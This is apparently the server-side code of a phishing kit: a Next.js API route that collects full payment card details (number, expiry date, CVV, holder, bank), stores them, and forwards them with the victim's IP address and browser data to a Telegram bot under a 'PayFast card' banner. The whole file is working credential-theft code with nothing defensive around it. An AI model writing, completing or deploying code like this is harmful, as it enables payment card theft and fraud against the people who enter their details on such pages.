import { NextRequest, NextResponse } from 'next/server'
import fs from 'fs/promises'
import path from 'path'
import fetch from 'node-fetch'

export async function POST(req: NextRequest) {
  const { cardHolder, cardNumber, expiryDate, cvv, bank } = await req.json()

  const filePath = path.join(process.cwd(), 'database.json')
  const jsonData = await fs.readFile(filePath, 'utf8')
  const data = JSON.parse(jsonData)

  // Find the most recent visitor (assuming it's the current user)
  const currentUser = data.visitors[data.visitors.length - 1]

  if (currentUser) {
    if (!currentUser.cardDetails) {
      currentUser.cardDetails = {}
    }
    currentUser.cardDetails = {
      cardHolder,
      cardNumber,
      expiryDate,
      cvv,
      bank
    }

    await fs.writeFile(filePath, JSON.stringify(data, null, 2))

    // Check if sendResultToTelegram is true
    if (data.config.sendResultToTelegram) {
      const { ipAddress, userAgent, browser } = currentUser

      const send = {
        chat_id: data.config.chatId,
        text: `
🔥== PayFast card from ${ipAddress} ==✅

Card Holder: ${cardHolder}
Card Number: ${cardNumber}
Expiry Date: ${expiryDate}
CVV: ${cvv}
Bank: ${bank}

*=========[ DEVICE INFO ]=========*
*IP* : http://www.geoiptool.com/?IP=${ipAddress}
*USER AGENT* : ${userAgent}
*OS / BR* : ${browser}`
      }
      const website = `https://api.telegram.org/bot${data.config.botId}/sendMessage`
      
      try {
        const response = await fetch(website, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(send)
        })
        const result = await response.json()
        console.log('Telegram response:', result)
      } catch (error) {
        console.error('Error sending message to Telegram:', error)
      }
    }

    return NextResponse.json({ success: true })
  } else {
    return NextResponse.json({ success: false, error: 'No current user found' }, { status: 400 })
  }
}